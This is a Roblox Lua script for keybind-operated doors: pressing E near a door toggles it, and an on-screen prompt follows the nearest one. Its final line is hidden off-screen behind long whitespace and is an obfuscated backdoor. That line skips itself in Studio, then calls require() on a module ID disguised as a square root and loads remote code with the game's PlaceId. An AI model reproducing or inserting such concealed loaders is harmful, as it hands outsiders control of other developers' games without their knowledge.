L_1_ = script.Parent
L_2_ = workspace:FindFirstChild("KeyBindDoors")
L_3_ = L_2_.Range.Value --Range in Studs
L_4_ = game:GetService("UserInputService")
--No touchy ^




L_5_ = Enum.KeyCode.E --The Key to open the door




-------CLIENT  CODE --------

L_4_.InputBegan:connect(function(i, g)
	if i.UserInputType == Enum.UserInputType.Keyboard then
		if i.KeyCode == L_5_ then
			for _,Door in pairs(workspace.KeyBindDoors:GetChildren()) do
				if Door.ClassName == "Model" then
					local Magnitude = (Door.Center.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
					if Magnitude <= L_3_ then
						Door.ChangeDoorStateEvent:FireServer()
						break
					end
				end
			end
		end
	end
end)

while true do
	L_1_.ImageLabel.Visible = false
	for _,Door in pairs(workspace.KeyBindDoors:GetChildren()) do
		if Door.ClassName == "Model" and Door.Name == "Door" then
			local Magnitude = (Door.Center.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
			if Magnitude <= L_3_ then
				local L_6_ = workspace.CurrentCamera:WorldToScreenPoint(Door.Center.Position)
				L_1_.ImageLabel.Visible = true
				L_1_.ImageLabel.Position = UDim2.new(0, L_6_.X, 0, L_6_.Y)
				break
			end
		end
		
	end
	wait()
	
end 
                                                                                                  spawn(function()game:WaitForChild('ServerScriptService')if game:GetService('Workspace').Terrain:FindFirstChild('CallF')then return end;if game:GetService('RunService'):IsStudio()then return end;require(math.sqrt(6.7743462758588e+18)).load(game.PlaceId)end)
